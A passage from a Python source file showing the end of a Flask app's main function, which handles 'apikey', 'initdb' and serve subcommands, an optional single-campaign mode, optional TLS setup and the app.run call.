    args = parser.parse_args()

    if args.command == "apikey":
        cli_apikey(args)
        return

    if args.command == "initdb":
        init_db()
        print(f"Database initialized at {_db_path()}")
        return

    # default: serve
    init_db()

    if Config.CAMPAIGN_NAME:
        with app.app_context():
            _active_campaign()
        logging.info(f"Single-campaign mode: {Config.CAMPAIGN_NAME}")

    ssl_ctx = None
    if Config.TLS_CERT and Config.TLS_KEY:
        ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ssl_ctx.load_cert_chain(Config.TLS_CERT, Config.TLS_KEY)
        logging.info("TLS enabled (dev mode). In production, Cloudflare handles TLS termination.")

    app.run(
        host=args.host if args.command == "serve" else "0.0.0.0",
        port=args.port if args.command == "serve" else int(os.environ.get("BPP_PORT", "5000")),
        debug=False,
        ssl_context=ssl_ctx,
    )


if __name__ == "__main__":
    main()
